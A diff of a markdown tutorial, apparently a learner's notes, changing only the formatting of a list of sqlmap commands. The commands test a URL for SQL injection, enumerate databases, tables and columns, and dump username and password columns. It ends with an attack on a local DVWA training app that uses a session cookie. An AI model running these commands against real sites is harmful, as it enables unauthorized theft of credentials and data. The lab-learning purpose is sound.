@@ -13,21 +13,31 @@ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
 ```
 
 ## commonly used commands:
-sqlmap -u  "url"   //test if the url is injectable with the test level 1
-sqlmap -u  "url"  –dbms mysql –level 3   //destinate that the database is mysql with the test level 3
-sqlmap -u  "url"  –cookie “your cookie” –level 2   //inject with cookie
-sqlmap -u  "url"  –dbms mysql –level 3 –dbs    //search the name of the databases
-sqlmap -u  "url"  –dbms mysql –level 3 -D "name of database" –tables   //search the tables in this database
-sqlmap -u  "url"  –dbms mysql –level 3 -D "name of database" -T "name of table" –columns    //search the columns in this table 
-sqlmap -u  "url"  –dbms mysql –level 3 -D "name of database" -T "name of table" –C “username,password” –dump
-//dump the data of the column "username" and "password"
+sqlmap -u  "url"   //test if the url is injectable with the test level 1  
+
+sqlmap -u  "url"  –dbms mysql –level 3   //destinate that the database is mysql with the test level 3  
+
+sqlmap -u  "url"  –cookie “your cookie” –level 2   //inject with cookie  
+
+sqlmap -u  "url"  –dbms mysql –level 3 –dbs    //search the name of the databases  
+
+sqlmap -u  "url"  –dbms mysql –level 3 -D "name of database" –tables   //search the tables in this database  
+
+sqlmap -u  "url"  –dbms mysql –level 3 -D "name of database" -T "name of table" –columns    //search the columns in this table  
+
+sqlmap -u  "url"  –dbms mysql –level 3 -D "name of database" -T "name of table" –C “username,password” –dump  
+
+//dump the data of the column "username" and "password"  
+
 
 see more you can visit http://www.vuln.cn/1992
 
 ## attack dvwa with sql map:
-first we try with 
+first we try with  
+
 ```
-python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=medium;PHPSESSID=ohkmhftad408oltet5pbe57se7" --batch -D dvwa -T users -C user,password --dump
+python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#"   
+--cookie="security=medium;PHPSESSID=ohkmhftad408oltet5pbe57se7" --batch -D dvwa -T users -C user,password --dump
 ```
 
 
